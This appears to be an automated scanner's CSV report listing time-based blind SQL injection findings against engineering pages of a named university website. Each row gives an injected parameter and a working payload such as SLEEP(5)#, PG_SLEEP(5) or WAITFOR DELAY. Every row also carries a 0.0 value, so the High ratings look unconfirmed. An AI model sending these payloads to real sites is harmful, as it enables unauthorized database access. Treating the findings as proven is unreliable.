Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1%27+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1%27+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574018027979-2bc18f3d-e0c7),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1%22+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1%22+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1%22+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=SLEEP%285%29%23#1574018027979-2bc18f3d-e0c7),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=SLEEP%285%29%23#1574018027979-2bc18f3d-e0c7),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1%22+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=SLEEP%285%29%23#1574018027979-2bc18f3d-e0c7),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1%22+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1%22+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=SLEEP%285%29%23#1574018027979-2bc18f3d-e0c7),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=SLEEP%285%29%23#1574018027979-2bc18f3d-e0c7),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=SLEEP%285%29%23#1574018027979-2bc18f3d-e0c7),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1%27+AND+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=SLEEP%285%29%23#1574018027979-2bc18f3d-e0c7),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1+OR+SLEEP%285%29#1574018027979-2bc18f3d-e0c7),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1+OR+SLEEP%285%29#1574018027979-2bc18f3d-e0c7),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1+OR+SLEEP%285%29#1574018027979-2bc18f3d-e0c7),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1+OR+SLEEP%285%29#1574018027979-2bc18f3d-e0c7),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1+OR+SLEEP%285%29#1574018027979-2bc18f3d-e0c7),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574018027979-2bc18f3d-e0c7),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1+OR+SLEEP%285%29#1574018027979-2bc18f3d-e0c7),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1+OR+SLEEP%285%29#1574018027979-2bc18f3d-e0c7),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574018027979-2bc18f3d-e0c7),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1%27+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1%27+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1%27+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1%27+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574018027979-2bc18f3d-e0c7),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1%27+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1%27+AND+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574018027979-2bc18f3d-e0c7),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574018027979-2bc18f3d-e0c7),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1%22+AND+SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1%27+AND+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1%27+AND+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1%27+AND+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1%27+AND+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1%27+AND+PG_SLEEP%285%29--#1574018027979-2bc18f3d-e0c7),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574018027979-2bc18f3d-e0c7),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574018027979-2bc18f3d-e0c7),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
